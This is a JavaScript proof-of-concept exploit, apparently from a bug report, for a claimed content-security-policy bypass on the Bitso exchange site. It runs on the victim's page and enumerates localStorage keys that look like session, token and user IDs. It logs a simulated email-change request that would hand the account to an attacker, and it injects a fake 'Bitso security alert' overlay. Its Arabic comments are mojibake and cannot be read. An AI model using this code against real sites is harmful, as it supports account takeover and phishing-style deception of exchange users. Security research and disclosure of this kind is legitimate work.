// exploit.js - Bitso CSP Bypass: Session Context Theft & Account Takeover Path
(function() {
    'use strict';

    console.log("[âœ… Bitso CSP Bypass] External script executed on:", document.domain);

    // 1. Ø¬Ù…Ø¹ Ø£Ø³Ù…Ø§Ø¡ Ù…ÙØ§ØªÙŠØ­ localStorage (Ø¨Ø¯ÙˆÙ† ÙƒØ´Ù Ø§Ù„Ù‚ÙŠÙ…)
    const localStorageKeys = [];
    for (let i = 0; i < localStorage.length; i++) {
        localStorageKeys.push(localStorage.key(i));
    }

    // 2. Ø§Ù„ÙƒØ´Ù Ø¹Ù† Ù…ÙØ§ØªÙŠØ­ Ø¹Ø§Ù„ÙŠØ© Ø§Ù„Ø®Ø·ÙˆØ±Ø©
    const highRiskKeys = localStorageKeys.filter(key =>
        /deviceId|usrId|session|token|user|id|ab\.storage/i.test(key)
    );

    if (highRiskKeys.length > 0) {
        console.warn("[ğŸš¨ HIGH-RISK KEYS FOUND]", highRiskKeys);

        // 3. Ù…Ø­Ø§ÙƒØ§Ø© Ø·Ù„Ø¨ ØªØºÙŠÙŠØ± Ø§Ù„Ø¨Ø±ÙŠØ¯ (Ø¨Ø¯ÙˆÙ† Ø¥Ø±Ø³Ø§Ù„ ÙØ¹Ù„ÙŠ)
        const simulatedRequest = {
            method: "POST",
            url: "https://bitso.com/api/v3/user/email",
            headers: {
                "x-device-id": "<REDACTED>", // Ù…Ù† localStorage
                "Content-Type": "application/json"
            },
            body: {
                newEmail: "attacker@example.com",
                usrId: "<REDACTED>" // Ù…Ù† localStorage
            }
        };

        console.log("[âš ï¸ SIMULATED] Email change request (NO 2FA required):");
        console.log(JSON.stringify(simulatedRequest, null, 2));

        // 4. ØªÙ†Ø¨ÙŠÙ‡ Ù…Ø±Ø¦ÙŠ (Ù„Ø¥Ø«Ø¨Ø§Øª UI Redressing)
        const alertBox = document.createElement('div');
        alertBox.innerHTML = `
            <div style="
                position: fixed;
                top: 20px;
                right: 20px;
                background: #fff8e1;
                border: 2px solid #ff9800;
                padding: 16px;
                border-radius: 8px;
                font-family: system-ui, sans-serif;
                z-index: 999999;
                box-shadow: 0 4px 12px rgba(0,0,0,0.15);
                max-width: 400px;
                font-size: 14px;
            ">
                <strong style="color: #e65100;">âš ï¸ ØªÙ†Ø¨ÙŠÙ‡ Ø£Ù…Ù†ÙŠ Ù…Ù† Bitso</strong><br>
                ØªÙ… Ø§ÙƒØªØ´Ø§Ù Ù†Ø´Ø§Ø· ØºÙŠØ± Ø¹Ø§Ø¯ÙŠ. ÙŠØ±Ø¬Ù‰ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø¬Ù„Ø³ØªÙƒ ÙÙˆØ±Ù‹Ø§.
            </div>
        `;
        document.body.appendChild(alertBox);

        console.log("[â„¹ï¸] PoC complete. No real data exfiltrated.");
    } else {
        console.log("[ğŸ”] No high-risk session keys found.");
    }
})();
